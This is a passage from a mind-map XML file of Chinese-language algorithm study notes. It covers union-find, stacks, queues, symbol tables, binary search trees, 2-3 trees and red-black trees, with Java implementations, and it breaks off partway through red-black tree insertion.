        if (sz[i] &lt; sz[j]) {
            id[i] = j;
            sz[j] += sz[i];
        } else {
            id[j] = i;
            sz[i] += sz[j];
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_280128594" CREATED="1754751613742" MODIFIED="1754751613744"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      路径压缩的加权 Quick Union
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      在检查节点的同时将它们直接链接到根节点，只需要在 find 中添加一个循环即可。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_338786973" CREATED="1754751613745" MODIFIED="1754751613747"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <table>
      <tr>
        <th>
          算法
        </th>
        <th>
          union
        </th>
        <th>
          find
        </th>
      </tr>
      <tr>
        <td>
          Quick Find
        </td>
        <td>
          N
        </td>
        <td>
          1
        </td>
      </tr>
      <tr>
        <td>
          Quick Union
        </td>
        <td>
          树高
        </td>
        <td>
          树高
        </td>
      </tr>
      <tr>
        <td>
          加权 Quick Union
        </td>
        <td>
          logN
        </td>
        <td>
          logN
        </td>
      </tr>
      <tr>
        <td>
          路径压缩的加权 Quick Union
        </td>
        <td>
          非常接近 1
        </td>
        <td>
          非常接近 1
        </td>
      </tr>
    </table>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_492018272" CREATED="1754750433502" MODIFIED="1754751615703" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    栈和队列
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1841023241" CREATED="1754751615705" MODIFIED="1754751615707"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      栈
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>public interface MyStack&lt;Item&gt; extends Iterable&lt;Item&gt; {
    MyStack&lt;Item&gt; push(Item item);
    Item pop() throws Exception;
    boolean isEmpty();
    int size();
}</pre>
  </body>
</html></richcontent>
<node ID="ID_953225806" CREATED="1754751615708" MODIFIED="1754751615711"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数组实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>public class ArrayStack&lt;Item&gt; implements MyStack&lt;Item&gt; {
    // 栈元素数组，只能通过转型来创建泛型数组
    private Item[] a = (Item[]) new Object[1];
    // 元素数量
    private int N = 0;
    @Override
    public MyStack&lt;Item&gt; push(Item item) {
        check();
        a[N++] = item;
        return this;
    }
    @Override
    public Item pop() throws Exception {
        if (isEmpty()) {
            throw new Exception(&quot;stack is empty&quot;);
        }
        Item item = a[--N];
        check();
        // 避免对象游离
        a[N] = null;
        return item;
    }
    private void check() {
        if (N &gt;= a.length) {
            resize(2 * a.length);
        } else if (N &gt; 0 &amp;&amp; N &lt;= a.length / 4) {
            resize(a.length / 2);
        }
    }
    /**
     * 调整数组大小，使得栈具有伸缩性
     */
    private void resize(int size) {
        Item[] tmp = (Item[]) new Object[size];
        for (int i = 0; i &lt; N; i++) {
            tmp[i] = a[i];
        }
        a = tmp;
    }
    @Override
    public boolean isEmpty() {
        return N == 0;
    }
    @Override
    public int size() {
        return N;
    }
    @Override
    public Iterator&lt;Item&gt; iterator() {
        // 返回逆序遍历的迭代器
        return new Iterator&lt;Item&gt;() {
            private int i = N;
            @Override
            public boolean hasNext() {
                return i &gt; 0;
            }
            @Override
            public Item next() {
                return a[--i];
            }
        };
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_324767610" CREATED="1754751615711" MODIFIED="1754751615713"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 链表实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      需要使用链表的头插法来实现，因为头插法中最后压入栈的元素在链表的开头，它的 next 指针指向前一个压入栈的元素，在弹出元素时就可以通过 next 指针遍历到前一个压入栈的元素从而让这个元素成为新的栈顶元素。
    </p>
    <pre>public class ListStack&lt;Item&gt; implements MyStack&lt;Item&gt; {
    private Node top = null;
    private int N = 0;
    private class Node {
        Item item;
        Node next;
    }
    @Override
    public MyStack&lt;Item&gt; push(Item item) {
        Node newTop = new Node();
        newTop.item = item;
        newTop.next = top;
        top = newTop;
        N++;
        return this;
    }
    @Override
    public Item pop() throws Exception {
        if (isEmpty()) {
            throw new Exception(&quot;stack is empty&quot;);
        }
        Item item = top.item;
        top = top.next;
        N--;
        return item;
    }
    @Override
    public boolean isEmpty() {
        return N == 0;
    }
    @Override
    public int size() {
        return N;
    }
    @Override
    public Iterator&lt;Item&gt; iterator() {
        return new Iterator&lt;Item&gt;() {
            private Node cur = top;
            @Override
            public boolean hasNext() {
                return cur != null;
            }
            @Override
            public Item next() {
                Item item = cur.item;
                cur = cur.next;
                return item;
            }
        };
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1223215171" CREATED="1754751615714" MODIFIED="1754751615716"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      队列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      下面是队列的链表实现，需要维护 first 和 last 节点指针，分别指向队首和队尾。
    </p>
    <p>
      这里需要考虑 first 和 last 指针哪个作为链表的开头。因为出队列操作需要让队首元素的下一个元素成为队首，所以需要容易获取下一个元素，而链表的头部节点的 next 指针指向下一个元素，因此可以让 first 指针链表的开头。
    </p>
    <pre>public interface MyQueue&lt;Item&gt; extends Iterable&lt;Item&gt; {
    int size();
    boolean isEmpty();
    MyQueue&lt;Item&gt; add(Item item);
    Item remove() throws Exception;
}</pre>
    <pre>public class ListQueue&lt;Item&gt; implements MyQueue&lt;Item&gt; {
    private Node first;
    private Node last;
    int N = 0;
    private class Node {
        Item item;
        Node next;
    }
    @Override
    public boolean isEmpty() {
        return N == 0;
    }
    @Override
    public int size() {
        return N;
    }
    @Override
    public MyQueue&lt;Item&gt; add(Item item) {
        Node newNode = new Node();
        newNode.item = item;
        newNode.next = null;
        if (isEmpty()) {
            last = newNode;
            first = newNode;
        } else {
            last.next = newNode;
            last = newNode;
        }
        N++;
        return this;
    }
    @Override
    public Item remove() throws Exception {
        if (isEmpty()) {
            throw new Exception(&quot;queue is empty&quot;);
        }
        Node node = first;
        first = first.next;
        N--;
        if (isEmpty()) {
            last = null;
        }
        return node.item;
    }
    @Override
    public Iterator&lt;Item&gt; iterator() {
        return new Iterator&lt;Item&gt;() {
            Node cur = first;
            @Override
            public boolean hasNext() {
                return cur != null;
            }
            @Override
            public Item next() {
                Item item = cur.item;
                cur = cur.next;
                return item;
            }
        };
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1201903721" CREATED="1754750433504" MODIFIED="1754751617624" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E7%AC%A6%E5%8F%B7%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    符号表
  </body>
</html>
</richcontent>
<node ID="ID_191440267" CREATED="1754751617626" MODIFIED="1754751617628"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      符号表（Symbol Table）是一种存储键值对的数据结构，可以支持快速查找操作。
    </p>
    <p>
      符号表分为有序和无序两种，有序符号表主要指支持 min()、max() 等根据键的大小关系来实现的操作。
    </p>
    <p>
      有序符号表的键需要实现 Comparable 接口。
    </p>
    <pre>public interface UnorderedST&lt;Key, Value&gt; {
    int size();
    Value get(Key key);
    void put(Key key, Value value);
    void delete(Key key);
}</pre>
    <pre>public interface OrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; {
    int size();
    void put(Key key, Value value);
    Value get(Key key);
    Key min();
    Key max();
    int rank(Key key);
    List&lt;Key&gt; keys(Key l, Key h);
}</pre>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1140062221" CREATED="1754751617628" MODIFIED="1754751617628"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      初级实现
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_409776051" CREATED="1754751617630" MODIFIED="1754751617632"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 链表实现无序符号表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>public class ListUnorderedST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; {
    private Node first;
    private class Node {
        Key key;
        Value value;
        Node next;
        Node(Key key, Value value, Node next) {
            this.key = key;
            this.value = value;
            this.next = next;
        }
    }
    @Override
    public int size() {
        int cnt = 0;
        Node cur = first;
        while (cur != null) {
            cnt++;
            cur = cur.next;
        }
        return cnt;
    }
    @Override
    public void put(Key key, Value value) {
        Node cur = first;
        // 如果在链表中找到节点的键等于 key 就更新这个节点的值为 value
        while (cur != null) {
            if (cur.key.equals(key)) {
                cur.value = value;
                return;
            }
            cur = cur.next;
        }
        // 否则使用头插法插入一个新节点
        first = new Node(key, value, first);
    }
    @Override
    public void delete(Key key) {
        if (first == null)
            return;
        if (first.key.equals(key))
            first = first.next;
        Node pre = first, cur = first.next;
        while (cur != null) {
            if (cur.key.equals(key)) {
                pre.next = cur.next;
                return;
            }
            pre = pre.next;
            cur = cur.next;
        }
    }
    @Override
    public Value get(Key key) {
        Node cur = first;
        while (cur != null) {
            if (cur.key.equals(key))
                return cur.value;
            cur = cur.next;
        }
        return null;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_628643020" CREATED="1754751617633" MODIFIED="1754751617643"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 二分查找实现有序符号表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      使用一对平行数组，一个存储键一个存储值。
    </p>
    <p>
      二分查找的 rank() 方法至关重要，当键在表中时，它能够知道该键的位置；当键不在表中时，它也能知道在何处插入新键。
    </p>
    <p>
      二分查找最多需要 logN+1 次比较，使用二分查找实现的符号表的查找操作所需要的时间最多是对数级别的。但是插入操作需要移动数组元素，是线性级别的。
    </p>
    <pre>public class BinarySearchOrderedST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; {
    private Key[] keys;
    private Value[] values;
    private int N = 0;
    public BinarySearchOrderedST(int capacity) {
        keys = (Key[]) new Comparable[capacity];
        values = (Value[]) new Object[capacity];
    }
    @Override
    public int size() {
        return N;
    }
    @Override
    public int rank(Key key) {
        int l = 0, h = N - 1;
        while (l &lt;= h) {
            int m = l + (h - l) / 2;
            int cmp = key.compareTo(keys[m]);
            if (cmp == 0)
                return m;
            else if (cmp &lt; 0)
                h = m - 1;
            else
                l = m + 1;
        }
        return l;
    }
    @Override
    public List&lt;Key&gt; keys(Key l, Key h) {
        int index = rank(l);
        List&lt;Key&gt; list = new ArrayList&lt;&gt;();
        while (keys[index].compareTo(h) &lt;= 0) {
            list.add(keys[index]);
            index++;
        }
        return list;
    }
    @Override
    public void put(Key key, Value value) {
        int index = rank(key);
        // 如果找到已经存在的节点键为 key，就更新这个节点的值为 value
        if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0) {
            values[index] = value;
            return;
        }
        // 否则在数组中插入新的节点，需要先将插入位置之后的元素都向后移动一个位置
        for (int j = N; j &gt; index; j--) {
            keys[j] = keys[j - 1];
            values[j] = values[j - 1];
        }
        keys[index] = key;
        values[index] = value;
        N++;
    }
    @Override
    public Value get(Key key) {
        int index = rank(key);
        if (index &lt; N &amp;&amp; keys[index].compareTo(key) == 0)
            return values[index];
        return null;
    }
    @Override
    public Key min() {
        return keys[0];
    }
    @Override
    public Key max() {
        return keys[N - 1];
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1569844764" CREATED="1754751617644" MODIFIED="1754751617646"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二叉查找树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>二叉树</strong>&#xa0;是一个空链接，或者是一个有左右两个链接的节点，每个链接都指向一颗子二叉树。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c11528f6-fc71-4a2b-8d2f-51b8954c38f1.jpg" width="180"/>
    <br/>
    

    <p>
      <strong>二叉查找树</strong>&#xa0;（BST）是一颗二叉树，并且每个节点的值都大于等于其左子树中的所有节点的值而小于等于右子树的所有节点的值。
    </p>
    <p>
      BST 有一个重要性质，就是它的中序遍历结果递增排序。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ef552ae3-ae0d-4217-88e6-99cbe8163f0c.jpg" width="200"/>
    <br/>
    

    <p>
      基本数据结构：
    </p>
    <pre>public class BST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; implements OrderedST&lt;Key, Value&gt; {
    protected Node root;
    protected class Node {
        Key key;
        Value val;
        Node left;
        Node right;
        // 以该节点为根的子树节点总数
        int N;
        // 红黑树中使用
        boolean color;
        Node(Key key, Value val, int N) {
            this.key = key;
            this.val = val;
            this.N = N;
        }
    }
    @Override
    public int size() {
        return size(root);
    }
    private int size(Node x) {
        if (x == null)
            return 0;
        return x.N;
    }
    protected void recalculateSize(Node x) {
        x.N = size(x.left) + size(x.right) + 1;
    }
}</pre>
    <p>
      为了方便绘图，下文中二叉树的空链接不画出来。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1403900252" CREATED="1754751617646" MODIFIED="1754751617648"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. get()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        如果树是空的，则查找未命中；
      </li>
      <li>
        如果被查找的键和根节点的键相等，查找命中；
      </li>
      <li>
        否则递归地在子树中查找：如果被查找的键较小就在左子树中查找，较大就在右子树中查找。
      </li>
    </ul>
    <pre>@Override
public Value get(Key key) {
    return get(root, key);
}
private Value get(Node x, Key key) {
    if (x == null)
        return null;
    int cmp = key.compareTo(x.key);
    if (cmp == 0)
        return x.val;
    else if (cmp &lt; 0)
        return get(x.left, key);
    else
        return get(x.right, key);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1282284177" CREATED="1754751617648" MODIFIED="1754751617650"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. put()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      当插入的键不存在于树中，需要创建一个新节点，并且更新上层节点的链接指向该节点，使得该节点正确地链接到树中。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/58b70113-3876-49af-85a9-68eb00a72d59.jpg" width="200"/>
    <br/>
    

    <pre>@Override
public void put(Key key, Value value) {
    root = put(root, key, value);
}
private Node put(Node x, Key key, Value value) {
    if (x == null)
        return new Node(key, value, 1);
    int cmp = key.compareTo(x.key);
    if (cmp == 0)
        x.val = value;
    else if (cmp &lt; 0)
        x.left = put(x.left, key, value);
    else
        x.right = put(x.right, key, value);
    recalculateSize(x);
    return x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_612145879" CREATED="1754751617650" MODIFIED="1754751617652"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      二叉查找树的算法运行时间取决于树的形状，而树的形状又取决于键被插入的先后顺序。
    </p>
    <p>
      最好的情况下树是完全平衡的，每条空链接和根节点的距离都为 logN。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c395a428-827c-405b-abd7-8a069316f583.jpg" width="200"/>
    <br/>
    

    <p>
      在最坏的情况下，树的高度为 N。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5ea609cb-8ad4-4c4c-aee6-45a40a81794a.jpg" width="200"/>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_382304115" CREATED="1754751617652" MODIFIED="1754751617654"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. floor()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      floor(key)：小于等于键的最大键
    </p>
    <ul>
      <li>
        如果键小于根节点的键，那么 floor(key) 一定在左子树中；
      </li>
      <li>
        如果键大于根节点的键，需要先判断右子树中是否存在 floor(key)，如果存在就返回，否则根节点就是 floor(key)。
      </li>
    </ul>
    <pre>public Key floor(Key key) {
    Node x = floor(root, key);
    if (x == null)
        return null;
    return x.key;
}
private Node floor(Node x, Key key) {
    if (x == null)
        return null;
    int cmp = key.compareTo(x.key);
    if (cmp == 0)
        return x;
    if (cmp &lt; 0)
        return floor(x.left, key);
    Node t = floor(x.right, key);
    return t != null ? t : x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_841999549" CREATED="1754751617654" MODIFIED="1754751617656"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. rank()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      rank(key) 返回 key 的排名。
    </p>
    <ul>
      <li>
        如果键和根节点的键相等，返回左子树的节点数；
      </li>
      <li>
        如果小于，递归计算在左子树中的排名；
      </li>
      <li>
        如果大于，递归计算在右子树中的排名，加上左子树的节点数，再加上 1（根节点）。
      </li>
    </ul>
    <pre>@Override
public int rank(Key key) {
    return rank(key, root);
}
private int rank(Key key, Node x) {
    if (x == null)
        return 0;
    int cmp = key.compareTo(x.key);
    if (cmp == 0)
        return size(x.left);
    else if (cmp &lt; 0)
        return rank(key, x.left);
    else
        return 1 + size(x.left) + rank(key, x.right);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1796847202" CREATED="1754751617656" MODIFIED="1754751617657"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. min()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>@Override
public Key min() {
    return min(root).key;
}
private Node min(Node x) {
    if (x == null)
        return null;
    if (x.left == null)
        return x;
    return min(x.left);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_179521595" CREATED="1754751617658" MODIFIED="1754751617660"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. deleteMin()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      令指向最小节点的链接指向最小节点的右子树。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/31b7e8de-ed11-4f69-b5fd-ba454120ac31.jpg" width="450"/>
    <br/>
    

    <pre>public void deleteMin() {
    root = deleteMin(root);
}
public Node deleteMin(Node x) {
    if (x.left == null)
        return x.right;
    x.left = deleteMin(x.left);
    recalculateSize(x);
    return x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_325985554" CREATED="1754751617660" MODIFIED="1754751617664"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. delete()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        如果待删除的节点只有一个子树， 那么只需要让指向待删除节点的链接指向唯一的子树即可；
      </li>
      <li>
        否则，让右子树的最小节点替换该节点。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/23b9d625-ef28-42b5-bb22-d7aedd007e16.jpg" width="400"/>
    <br/>
    

    <pre>public void delete(Key key) {
    root = delete(root, key);
}
private Node delete(Node x, Key key) {
    if (x == null)
        return null;
    int cmp = key.compareTo(x.key);
    if (cmp &lt; 0)
        x.left = delete(x.left, key);
    else if (cmp &gt; 0)
        x.right = delete(x.right, key);
    else {
        if (x.right == null)
            return x.left;
        if (x.left == null)
            return x.right;
        Node t = x;
        x = min(t.right);
        x.right = deleteMin(t.right);
        x.left = t.left;
    }
    recalculateSize(x);
    return x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_538285858" CREATED="1754751617664" MODIFIED="1754751617666"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. keys()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      利用二叉查找树中序遍历的结果为递增的特点。
    </p>
    <pre>@Override
public List&lt;Key&gt; keys(Key l, Key h) {
    return keys(root, l, h);
}
private List&lt;Key&gt; keys(Node x, Key l, Key h) {
    List&lt;Key&gt; list = new ArrayList&lt;&gt;();
    if (x == null)
        return list;
    int cmpL = l.compareTo(x.key);
    int cmpH = h.compareTo(x.key);
    if (cmpL &lt; 0)
        list.addAll(keys(x.left, l, h));
    if (cmpL &lt;= 0 &amp;&amp; cmpH &gt;= 0)
        list.add(x.key);
    if (cmpH &gt; 0)
        list.addAll(keys(x.right, l, h));
    return list;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_826083139" CREATED="1754751617666" MODIFIED="1754751617668"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      10. 分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      二叉查找树所有操作在最坏的情况下所需要的时间都和树的高度成正比。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1465194080" CREATED="1754751617668" MODIFIED="1754751617670"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2-3 查找树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      2-3 查找树引入了 2- 节点和 3- 节点，目的是为了让树平衡。一颗完美平衡的 2-3 查找树的所有空链接到根节点的距离应该是相同的。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1097658b-c0e6-4821-be9b-25304726a11c.jpg" width="160px"/>
    <br/>
  </body>
</html></richcontent>
<node ID="ID_1006406660" CREATED="1754751617670" MODIFIED="1754751617673"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 插入操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      插入操作和 BST 的插入操作有很大区别，BST 的插入操作是先进行一次未命中的查找，然后再将节点插入到对应的空链接上。但是 2-3 查找树如果也这么做的话，那么就会破坏了平衡性。它是将新节点插入到叶子节点上。
    </p>
    <p>
      根据叶子节点的类型不同，有不同的处理方式：
    </p>
    <ul>
      <li>
        如果插入到 2- 节点上，那么直接将新节点和原来的节点组成 3- 节点即可。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c6f9930-8704-4a54-af23-19f9ca3e48b0.jpg" width="350"/>
    <br/>
    

    <ul>
      <li>
        如果是插入到 3- 节点上，就会产生一个临时 4- 节点时，需要将 4- 节点分裂成 3 个 2- 节点，并将中间的 2- 节点移到上层节点中。如果上移操作继续产生临时 4- 节点则一直进行分裂上移，直到不存在临时 4- 节点。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7002c01b-1ed5-475a-9e5f-5fc8a4cdbcc0.jpg" width="460"/>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1084254876" CREATED="1754751617674" MODIFIED="1754751617676"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 性质
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      2-3 查找树插入操作的变换都是局部的，除了相关的节点和链接之外不必修改或者检查树的其它部分，而这些局部变换不会影响树的全局有序性和平衡性。
    </p>
    <p>
      2-3 查找树的查找和插入操作复杂度和插入顺序无关，在最坏的情况下查找和插入操作访问的节点必然不超过 logN 个，含有 10 亿个节点的 2-3 查找树最多只需要访问 30 个节点就能进行任意的查找和插入操作。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_587422234" CREATED="1754751617676" MODIFIED="1754751617678"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      红黑树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      红黑树是 2-3 查找树，但它不需要分别定义 2- 节点和 3- 节点，而是在普通的二叉查找树之上，为节点添加颜色。指向一个节点的链接颜色如果为红色，那么这个节点和上层节点表示的是一个 3- 节点，而黑色则是普通链接。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f1912ba6-6402-4321-9aa8-13d32fd121d1.jpg" width="240"/>
    <br/>
    

    <p>
      红黑树具有以下性质：
    </p>
    <ul>
      <li>
        红链接都为左链接；
      </li>
      <li>
        完美黑色平衡，即任意空链接到根节点的路径上的黑链接数量相同。
      </li>
    </ul>
    <p>
      画红黑树时可以将红链接画平。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f5cb6028-425d-4939-91eb-cca9dd6b6c6c.jpg" width="220"/>
    <br/>
    

    <pre>public class RedBlackBST&lt;Key extends Comparable&lt;Key&gt;, Value&gt; extends BST&lt;Key, Value&gt; {
    private static final boolean RED = true;
    private static final boolean BLACK = false;
    private boolean isRed(Node x) {
        if (x == null)
            return false;
        return x.color == RED;
    }
}</pre>
  </body>
</html></richcontent>
<node ID="ID_1335552869" CREATED="1754751617679" MODIFIED="1754751617682"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 左旋转
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      因为合法的红链接都为左链接，如果出现右链接为红链接，那么就需要进行左旋转操作。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f4d534ab-0092-4a81-9e5b-ae889b9a72be.jpg" width="480"/>
    <br/>
    

    <pre>public Node rotateLeft(Node h) {
    Node x = h.right;
    h.right = x.left;
    x.left = h;
    x.color = h.color;
    h.color = RED;
    x.N = h.N;
    recalculateSize(h);
    return x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_949843090" CREATED="1754751617682" MODIFIED="1754751617685"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 右旋转
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      进行右旋转是为了转换两个连续的左红链接，这会在之后的插入过程中探讨。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c8ffea-a9f2-4ebe-97d1-d71be71246f9.jpg" width="480"/>
    <br/>
    

    <pre>public Node rotateRight(Node h) {
    Node x = h.left;
    h.left = x.right;
    x.right = h;
    x.color = h.color;
    h.color = RED;
    x.N = h.N;
    recalculateSize(h);
    return x;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1935895490" CREATED="1754751617685" MODIFIED="1754751617687"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 颜色转换
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      一个 4- 节点在红黑树中表现为一个节点的左右子节点都是红色的。分裂 4- 节点除了需要将子节点的颜色由红变黑之外，同时需要将父节点的颜色由黑变红，从 2-3 树的角度看就是将中间节点移到上层节点。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/094b279a-b2db-4be7-87a3-b2a039c7448e.jpg" width="270"/>
    <br/>
    

    <pre>void flipColors(Node h) {
    h.color = RED;
    h.left.color = BLACK;
    h.right.color = BLACK;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_532515394" CREATED="1754751617688" MODIFIED="1754751617689"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 插入
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      先将一个节点按二叉查找树的方法插入到正确位置，然后再进行如下颜色操作：
